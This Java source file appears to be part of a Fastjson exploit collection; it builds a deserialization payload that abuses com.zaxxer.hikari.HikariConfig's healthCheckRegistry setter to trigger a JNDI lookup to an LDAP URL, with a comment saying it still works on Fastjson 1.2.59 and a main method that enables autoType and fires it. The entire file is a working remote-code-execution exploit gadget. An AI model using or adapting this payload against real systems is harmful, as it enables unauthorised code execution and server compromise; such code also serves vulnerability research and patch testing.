package fastjsonExp;

import com.zaxxer.hikari.HikariConfig;
import utils.FastjsonVersionCtr;
import utils.StringUtils;


/**
 * 已完成
 * hikariCP
 * still work at fastjson 1.2.59
 */
public class EXP4hikariCP {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"replace_here\"}";
    public  void actual_fun(String url){
        HikariConfig hikariConfig = new HikariConfig();
        hikariConfig.setHealthCheckRegistry(url);
    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4hikariCP(){}
    public EXP4hikariCP(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.59");
        myFastjson.mySetAutoType(true);
        EXP4hikariCP exp = new EXP4hikariCP("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }
}
